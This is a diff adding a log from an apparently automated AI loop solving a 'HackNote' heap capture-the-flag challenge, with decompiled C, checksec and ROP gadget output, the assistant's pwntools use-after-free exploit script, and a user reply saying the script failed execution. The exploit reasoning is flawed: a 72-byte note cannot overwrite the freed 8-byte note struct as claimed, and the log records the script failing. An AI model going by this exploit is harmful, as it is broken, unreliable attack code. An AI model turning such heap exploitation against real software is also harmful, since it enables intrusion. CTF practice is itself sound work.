@@ -1,0 +1,331 @@
+{'documents': [],
+ 'error': 'yes',
+ 'generation': code(prefix='To solve this challenge using pwntools, we need to craft an exploit that will leverage the vulnerability in the `add_note`, `del_note`, and `print_note` functions. The key insight is that after deleting a note, the pointer to the content of the note is not set to NULL, which means we can reuse it to point to arbitrary memory. We can overwrite the function pointer in one of the notes to point to the `magic` function, which will call `system("cat flag");`. This way, when we print the note, it will execute the `magic` function and give us the flag. Here are the steps for the exploit:\n1. Add two notes.\n2. Delete the first note.\n3. Add a new note with a size that overlaps with the first note\'s function pointer.\n4. Overwrite the function pointer of the first note with the address of the `magic` function.\n5. Print the first note to trigger the `magic` function and get the flag.\n', imports="from pwn import *\n\n# Set up pwntools for the correct architecture and context\ncontext.binary = './pwn/heap/heap-1/heap1'\ncontext.terminal = ['gnome-terminal', '-e']\n\n# Define the target process\nio = process('./pwn/heap/heap-1/heap1')\n\n# Find the address of the magic function\nelf = ELF('./pwn/heap/heap-1/heap1')\nmagic_addr = elf.symbols['magic']", code="def add_note(size, content):\n    io.sendlineafter(b'Your choice :', b'1')\n    io.sendlineafter(b'Note size :', str(size).encode())\n    io.sendlineafter(b'Content :', content)\n\n\ndef del_note(index):\n    io.sendlineafter(b'Your choice :', b'2')\n    io.sendlineafter(b'Index :\\n', str(index).encode())\n\n\ndef print_note(index):\n    io.sendlineafter(b'Your choice :', b'3')\n    io.sendlineafter(b'Index :\\n', str(index).encode())\n\n\n# Step 1: Add two notes\nadd_note(64, b'A' * 64)  # Note 0\nadd_note(64, b'B' * 64)  # Note 1\n\n# Step 2: Delete the first note\n# After this, the chunk at index 0 is freed, but the pointer to the content is still in the list\n# and can be reused if we allocate a new chunk of the same size\n# (or larger, overlapping with the function pointer).\ndel_note(0)\n\n# Step 3: Add a new note with a size that overlaps with the first note's function pointer\n# The size 72 is enough to cover the 8 bytes of the function pointer and 64 bytes of the original content\nadd_note(72, b'C' * 8 + p32(magic_addr))  # Note 2, overwriting the function pointer of Note 0\n\n# Step 4: Overwrite the function pointer of the first note with the address of the magic function\n# This is done as part of the previous step\n\n# Step 5: Print the first note to trigger the magic function and get the flag\nprint_note(0)\n\n# Interact with the process to see the result\nio.interactive()"),
+ 'info': 'Challenge is a ELF 32-bit LSB executable file and the file path is '
+         '"./pwn/heap/heap-1/heap1".\n'
+         '1.Here is the key function for exploit in the C file decompiled from '
+         'heap1:\n'
+         'unsigned int add_note()\n'
+         '{\n'
+         '  int v0; // ebx\n'
+         '  int i; // [esp+Ch] [ebp-1Ch]\n'
+         '  int size; // [esp+10h] [ebp-18h]\n'
+         '  char buf[8]; // [esp+14h] [ebp-14h] BYREF\n'
+         '  unsigned int v5; // [esp+1Ch] [ebp-Ch]\n'
+         '\n'
+         '  v5 = __readgsdword(0x14u);\n'
+         '  if ( count <= 5 )\n'
+         '  {\n'
+         '    for ( i = 0; i <= 4; ++i )\n'
+         '    {\n'
+         '      if ( !*(&notelist + i) )\n'
+         '      {\n'
+         '        *(&notelist + i) = malloc(8u);\n'
+         '        if ( !*(&notelist + i) )\n'
+         '        {\n'
+         '          puts("Alloca Error");\n'
+         '          exit(-1);\n'
+         '        }\n'
+         '        *(_DWORD *)*(&notelist + i) = print_note_content;\n'
+         '        printf("Note size :");\n'
+         '        read(0, buf, 8u);\n'
+         '        size = atoi(buf);\n'
+         '        v0 = (int)*(&notelist + i);\n'
+         '        *(_DWORD *)(v0 + 4) = malloc(size);\n'
+         '        if ( !*((_DWORD *)*(&notelist + i) + 1) )\n'
+         '        {\n'
+         '          puts("Alloca Error");\n'
+         '          exit(-1);\n'
+         '        }\n'
+         '        printf("Content :");\n'
+         '        read(0, *((void **)*(&notelist + i) + 1), size);\n'
+         '        puts("Success !");\n'
+         '        ++count;\n'
+         '        return __readgsdword(0x14u) ^ v5;\n'
+         '      }\n'
+         '    }\n'
+         '  }\n'
+         '  else\n'
+         '  {\n'
+         '    puts("Full");\n'
+         '  }\n'
+         '  return __readgsdword(0x14u) ^ v5;\n'
+         '}\n'
+         '\n'
+         'unsigned int del_note()\n'
+         '{\n'
+         '  int v1; // [esp+4h] [ebp-14h]\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v3; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v3 = __readgsdword(0x14u);\n'
+         '  printf("Index :\\n");\n'
+         '  read(0, buf, 4u);\n'
+         '  v1 = atoi(buf);\n'
+         '  if ( v1 < 0 || v1 >= count )\n'
+         '  {\n'
+         '    puts("Out of bound!");\n'
+         '    _exit(0);\n'
+         '  }\n'
+         '  if ( *(&notelist + v1) )\n'
+         '  {\n'
+         '    free(*((void **)*(&notelist + v1) + 1));\n'
+         '    free(*(&notelist + v1));\n'
+         '    puts("Success");\n'
+         '  }\n'
+         '  return __readgsdword(0x14u) ^ v3;\n'
+         '}\n'
+         '\n'
+         'unsigned int print_note()\n'
+         '{\n'
+         '  int v1; // [esp+4h] [ebp-14h]\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v3; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v3 = __readgsdword(0x14u);\n'
+         '  printf("Index :\\n");\n'
+         '  read(0, buf, 4u);\n'
+         '  v1 = atoi(buf);\n'
+         '  if ( v1 < 0 || v1 >= count )\n'
+         '  {\n'
+         '    puts("Out of bound!");\n'
+         '    _exit(0);\n'
+         '  }\n'
+         '  if ( *(&notelist + v1) )\n'
+         '    (*(void (__cdecl **)(_DWORD))*(&notelist + v1))(*(&notelist + '
+         'v1));\n'
+         '  return __readgsdword(0x14u) ^ v3;\n'
+         '}\n'
+         '\n'
+         'int magic()\n'
+         '{\n'
+         '  return system("cat flag");\n'
+         '}\n'
+         '\n'
+         'int menu()\n'
+         '{\n'
+         '  puts("----------------------");\n'
+         '  puts("       HackNote       ");\n'
+         '  puts("----------------------");\n'
+         '  puts(" 1. Add note          ");\n'
+         '  puts(" 2. Delete note       ");\n'
+         '  puts(" 3. Print note        ");\n'
+         '  puts(" 4. Exit              ");\n'
+         '  puts("----------------------");\n'
+         '  return printf("Your choice :");\n'
+         '}\n'
+         '\n'
+         'int __cdecl __noreturn main(int argc, const char **argv, const char '
+         '**envp)\n'
+         '{\n'
+         '  int v3; // eax\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v5; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v5 = __readgsdword(0x14u);\n'
+         '  setvbuf(stdout, 0, 2, 0);\n'
+         '  setvbuf(stdin, 0, 2, 0);\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    while ( 1 )\n'
+         '    {\n'
+         '      menu();\n'
+         '      read(0, buf, 4u);\n'
+         '      v3 = atoi(buf);\n'
+         '      if ( v3 != 2 )\n'
+         '        break;\n'
+         '      del_note();\n'
+         '    }\n'
+         '    if ( v3 > 2 )\n'
+         '    {\n'
+         '      if ( v3 == 3 )\n'
+         '      {\n'
+         '        print_note();\n'
+         '      }\n'
+         '      else\n'
+         '      {\n'
+         '        if ( v3 == 4 )\n'
+         '          exit(0);\n'
+         'LABEL_13:\n'
+         '        puts("Invalid choice");\n'
+         '      }\n'
+         '    }\n'
+         '    else\n'
+         '    {\n'
+         '      if ( v3 != 1 )\n'
+         '        goto LABEL_13;\n'
+         '      add_note();\n'
+         '    }\n'
+         '  }\n'
+         '}\n'
+         '\n'
+         "2.Here is the file security infomation identified by 'checksec' "
+         'command:\n'
+         '{"relro": "partial", "canary": "yes", "nx": "yes", "pie": "no", '
+         '"rpath": "no", "runpath": "no", "symbols": "yes", "fortify_source": '
+         '"no", "fortified": "0", "fortify-able": "2"}\n'
+         '\n'
+         '3.We use ROPgadget to search gadgets on heap1:\n'
+         'Gadgets information\n'
+         '============================================================\n'
+         '0x08048b5b : pop ebp ; ret\n'
+         '0x08048b58 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048479 : pop ebx ; ret\n'
+         '0x08048b5a : pop edi ; pop ebp ; ret\n'
+         '0x08048b59 : pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048462 : ret\n'
+         '0x080486d3 : ret 0x458b\n'
+         '0x080485de : ret 0xeac1\n'
+         '\n'
+         'Unique gadgets found: 8\n'
+         '\n'
+         "4.Here is information of the file's relocation section:\n"
+         "Relocation section '.rel.plt' at offset 0x3f8 contains 12 entries:\n"
+         ' Offset     Info    Type            Sym.Value  Sym. Name\n'
+         '0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n'
+         '0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n'
+         '0804a014  00000307 R_386_JUMP_SLOT   00000000   _exit@GLIBC_2.0\n'
+         '0804a018  00000407 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0\n'
+         '0804a01c  00000507 R_386_JUMP_SLOT   00000000   '
+         '__stack_chk_fail@GLIBC_2.4\n'
+         '0804a020  00000607 R_386_JUMP_SLOT   00000000   malloc@GLIBC_2.0\n'
+         '0804a024  00000707 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0\n'
+         '0804a028  00000807 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0\n'
+         '0804a02c  00000a07 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0\n'
+         '0804a030  00000b07 R_386_JUMP_SLOT   00000000   '
+         '__libc_start_main@GLIBC_2.0\n'
+         '0804a034  00000c07 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0\n'
+         '0804a038  00000d07 R_386_JUMP_SLOT   00000000   atoi@GLIBC_2.0\n'
+         '\n',
+ 'iterations': 1,
+ 'messages': [('user', 'How do I use pwntool to solve this challange?'),
+              ('assistant',
+               'To solve this challenge using pwntools, we need to craft an '
+               'exploit that will leverage the vulnerability in the '
+               '`add_note`, `del_note`, and `print_note` functions. The key '
+               'insight is that after deleting a note, the pointer to the '
+               'content of the note is not set to NULL, which means we can '
+               'reuse it to point to arbitrary memory. We can overwrite the '
+               'function pointer in one of the notes to point to the `magic` '
+               'function, which will call `system("cat flag");`. This way, '
+               'when we print the note, it will execute the `magic` function '
+               'and give us the flag. Here are the steps for the exploit:\n'
+               '1. Add two notes.\n'
+               '2. Delete the first note.\n'
+               '3. Add a new note with a size that overlaps with the first '
+               "note's function pointer.\n"
+               '4. Overwrite the function pointer of the first note with the '
+               'address of the `magic` function.\n'
+               '5. Print the first note to trigger the `magic` function and '
+               'get the flag.\n'
+               ' \n'
+               ' Imports: from pwn import *\n'
+               '\n'
+               '# Set up pwntools for the correct architecture and context\n'
+               "context.binary = './pwn/heap/heap-1/heap1'\n"
+               "context.terminal = ['gnome-terminal', '-e']\n"
+               '\n'
+               '# Define the target process\n'
+               "io = process('./pwn/heap/heap-1/heap1')\n"
+               '\n'
+               '# Find the address of the magic function\n'
+               "elf = ELF('./pwn/heap/heap-1/heap1')\n"
+               "magic_addr = elf.symbols['magic'] \n"
+               ' Code: def add_note(size, content):\n'
+               "    io.sendlineafter(b'Your choice :', b'1')\n"
+               "    io.sendlineafter(b'Note size :', str(size).encode())\n"
+               "    io.sendlineafter(b'Content :', content)\n"
+               '\n'
+               '\n'
+               'def del_note(index):\n'
+               "    io.sendlineafter(b'Your choice :', b'2')\n"
+               "    io.sendlineafter(b'Index :\\n', str(index).encode())\n"
+               '\n'
+               '\n'
+               'def print_note(index):\n'
+               "    io.sendlineafter(b'Your choice :', b'3')\n"
+               "    io.sendlineafter(b'Index :\\n', str(index).encode())\n"
+               '\n'
+               '\n'
+               '# Step 1: Add two notes\n'
+               "add_note(64, b'A' * 64)  # Note 0\n"
+               "add_note(64, b'B' * 64)  # Note 1\n"
+               '\n'
+               '# Step 2: Delete the first note\n'
+               '# After this, the chunk at index 0 is freed, but the pointer '
+               'to the content is still in the list\n'
+               '# and can be reused if we allocate a new chunk of the same '
+               'size\n'
+               '# (or larger, overlapping with the function pointer).\n'
+               'del_note(0)\n'
+               '\n'
+               '# Step 3: Add a new note with a size that overlaps with the '
+               "first note's function pointer\n"
+               '# The size 72 is enough to cover the 8 bytes of the function '
+               'pointer and 64 bytes of the original content\n'
+               "add_note(72, b'C' * 8 + p32(magic_addr))  # Note 2, "
+               'overwriting the function pointer of Note 0\n'
+               '\n'
+               '# Step 4: Overwrite the function pointer of the first note '
+               'with the address of the magic function\n'
+               '# This is done as part of the previous step\n'
+               '\n'
+               '# Step 5: Print the first note to trigger the magic function '
+               'and get the flag\n'
+               'print_note(0)\n'
+               '\n'
+               '# Interact with the process to see the result\n'
+               'io.interactive()'),
+              ('user',
+               "Your solution failed the code execution test: 'str' object has "
+               "no attribute 'decode'")]}
+from pwn import *
+
+# Set up pwntools for the correct architecture and context
+context.binary = './pwn/heap/heap-1/heap1'
+context.terminal = ['gnome-terminal', '-e']
+
+# Define the target process
+io = process('./pwn/heap/heap-1/heap1')
+
+# Find the address of the magic function
+elf = ELF('./pwn/heap/heap-1/heap1')
+magic_addr = elf.symbols['magic']
+def add_note(size, content):
+    io.sendlineafter(b'Your choice :', b'1')
+    io.sendlineafter(b'Note size :', str(size).encode())
+    io.sendlineafter(b'Content :', content)
+
+
+def del_note(index):
+    io.sendlineafter(b'Your choice :', b'2')
+    io.sendlineafter(b'Index :\n', str(index).encode())
+
+
+def print_note(index):
+    io.sendlineafter(b'Your choice :', b'3')
+    io.sendlineafter(b'Index :\n', str(index).encode())
+
+
+# Step 1: Add two notes
+add_note(64, b'A' * 64)  # Note 0
+add_note(64, b'B' * 64)  # Note 1
+
+# Step 2: Delete the first note
+# After this, the chunk at index 0 is freed, but the pointer to the content is still in the list
+# and can be reused if we allocate a new chunk of the same size
+# (or larger, overlapping with the function pointer).
+del_note(0)
+
+# Step 3: Add a new note with a size that overlaps with the first note's function pointer
+# The size 72 is enough to cover the 8 bytes of the function pointer and 64 bytes of the original content
+add_note(72, b'C' * 8 + p32(magic_addr))  # Note 2, overwriting the function pointer of Note 0
+
+# Step 4: Overwrite the function pointer of the first note with the address of the magic function
+# This is done as part of the previous step
+
+# Step 5: Print the first note to trigger the magic function and get the flag
+print_note(0)
+
+# Interact with the process to see the result
+io.interactive()
